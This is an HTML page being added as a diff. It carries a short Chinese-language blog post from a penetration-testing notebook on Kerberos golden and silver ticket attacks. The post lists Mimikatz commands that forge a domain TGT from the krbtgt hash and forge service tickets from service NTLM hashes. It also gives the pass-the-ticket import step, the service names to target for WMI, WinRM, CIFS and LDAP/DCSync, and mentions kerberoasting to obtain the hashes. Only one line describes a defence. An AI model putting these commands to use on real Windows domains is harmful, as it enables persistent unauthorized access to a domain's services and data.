@@ -1,0 +1,213 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta name="Keywords" content="blog"/>
+    <meta name="Description" content="blog"/>
+    <title>Simple</title>
+    <link rel="shortcut icon" href="/static/favicon.png"/>
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+</head>
+<body>
+<div class="main">
+    <div class="header">
+    	<ul id="pages">
+            <li><a href="/">home</a></li>
+            <li><a href="/#/tags">tags</a></li>
+            <li><a href="/#/archive">archive</a></li>
+    	</ul>
+    </div>
+	<div class="wrap-header">
+    <h1>
+    <a href="/" id="title"></a>
+    </h1>
+	</div>
+<xmp id="md" style="display: none;">
+<!-- markdown -->
+## Kerberos
+
+kerberos 协议认证流程
+
+```
+1. Client 请求 AS 得到 TGT
+2. Client 携带 TGT 请求 TGS 得到 TGS Ticket/ST
+3. Client 携带 ST 请求 Server
+```
+
+## Golden Ticket
+
+通过伪造高权限的 TGT, 以达到访问域中所有服务的目的
+
+```
+kerberos::golden /user:FAKEUSERNAME /domain:DOMAINNAME /sid:DOMAINSID /krbtgt:KRBTGTNTLMHASH
+```
+
+添加 `/ptt` 参数可在直接当前会话中使用 ticket
+
+导入 ticket
+
+```
+kerberos::ptt ticket.kirbi
+```
+
+默认有效时间为 20 分钟, 过期可重新导入
+
+通过快速更改 krbtgt 密码两次可使 golden ticket 失效
+
+## Silver Ticket
+
+通过伪造 ST 访问指定服务, 仅能使用一次
+
+```
+kerberos::golden /user:FAKEUSERNAME /domain:DOMAINNAME /sid:DOMAINSID /target:TARGETFQDN /service:SERVICENAME /rc4:SERVICENTLMHASH
+```
+
+添加 `/ptt` 参数可在直接当前会话中使用 ticket
+
+其中服务 Hash 还可通过 kerberoast 爆破获取
+
+service
+
+````
+WMI: HOST RPCSS
+WinRM: HOST HTTP
+Scheduled Tasks: HOST
+Windows File Share: CIFS
+PowerShell Remoting: HOST HTTP
+LDAP operations including Mimikatz DCSync: LDAP
+Windows Remote Server Administration Tools: RPCSS LDAP CIFS
+```
+导入 ticket
+
+```
+kerberos::ptt ticket.kirbi
+```
+<!-- markdown end -->
+</xmp>
+<div class="entry" id="main">
+<!-- content -->
+<h2 id="kerberos">Kerberos</h2>
+
+<p>kerberos 协议认证流程</p>
+
+<pre><code>1. Client 请求 AS 得到 TGT
+2. Client 携带 TGT 请求 TGS 得到 TGS Ticket/ST
+3. Client 携带 ST 请求 Server
+</code></pre>
+
+<h2 id="goldenticket">Golden Ticket</h2>
+
+<p>通过伪造高权限的 TGT, 以达到访问域中所有服务的目的</p>
+
+<pre><code>kerberos::golden /user:FAKEUSERNAME /domain:DOMAINNAME /sid:DOMAINSID /krbtgt:KRBTGTNTLMHASH
+</code></pre>
+
+<p>添加 <code>/ptt</code> 参数可在直接当前会话中使用 ticket</p>
+
+<p>导入 ticket</p>
+
+<pre><code>kerberos::ptt ticket.kirbi
+</code></pre>
+
+<p>默认有效时间为 20 分钟, 过期可重新导入</p>
+
+<p>通过快速更改 krbtgt 密码两次可使 golden ticket 失效</p>
+
+<h2 id="silverticket">Silver Ticket</h2>
+
+<p>通过伪造 ST 访问指定服务, 仅能使用一次</p>
+
+<pre><code>kerberos::golden /user:FAKEUSERNAME /domain:DOMAINNAME /sid:DOMAINSID /target:TARGETFQDN /service:SERVICENAME /rc4:SERVICENTLMHASH
+</code></pre>
+
+<p>添加 <code>/ptt</code> 参数可在直接当前会话中使用 ticket</p>
+
+<p>其中服务 Hash 还可通过 kerberoast 爆破获取</p>
+
+<p>service</p>
+
+<pre><code class="`">WMI: HOST RPCSS
+WinRM: HOST HTTP
+Scheduled Tasks: HOST
+Windows File Share: CIFS
+PowerShell Remoting: HOST HTTP
+LDAP operations including Mimikatz DCSync: LDAP
+Windows Remote Server Administration Tools: RPCSS LDAP CIFS
+</code></pre>
+
+<p>导入 ticket</p>
+
+<pre><code>kerberos::ptt ticket.kirbi
+</code></pre>
+<!-- content end -->
+</div>
+<br>
+<br>
+    <div id="disqus_thread"></div>
+	<div class="footer">
+		<p>© Copyright 2017-2019 by X1r0z</p>
+	</div>
+</div>
+<script src="main.js"></script>
+<script id="content" type="text/mustache">
+    <h1>{{title}}</h1>
+    <div class="tag">
+    {{date}}
+    {{#tags}}
+    <a href="/#/tag/{{name}}">#{{name}}</a>
+    {{/tags}}
+    </div>
+</script>
+<script id="pagesTemplate" type="text/mustache">
+    {{#pages}}
+    <li>
+        <a href="{{path}}">{{title}}</a>
+    </li>
+    {{/pages}}
+</script>
+<script>
+$(document).ready(function() {
+    $.ajax({
+        url: "main.json",
+        type: "GET",
+        dataType: "json",
+        success: function(data) {
+            $("#title").html(data.name);
+            var pagesTemplate = Hogan.compile($("#pagesTemplate").html());
+            var pagesHtml = pagesTemplate.render({"pages": data.pages});
+            $("#pages").append(pagesHtml);
+            //path
+            var path = "golden-and-silver-tickets.html";
+            //path end
+            var now = 0;
+            for (var i = 0; i < data.posts.length; ++i)
+                if (path == data.posts[i].path)
+                    now = i;
+            var post = data.posts[now];
+            var tmp = post.tags.split(" ");
+            var tags = [];
+            for (var i = 0; i < tmp.length; ++i)
+                if (tmp[i].length > 0)
+                    tags.push({"name": tmp[i]});
+            var contentTemplate = Hogan.compile($("#content").html());
+            var contentHtml = contentTemplate.render({"title": post.title, "tags": tags, "date": post.date});
+            $("#main").prepend(contentHtml);
+            if (data.disqus_shortname.length > 0) {
+                var disqus_shortname = data.disqus_shortname;
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            }
+        }
+    });
+});
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ["\\(", "\\)"]], processEscapes: true}});
+</script>
+</body>
+</html>
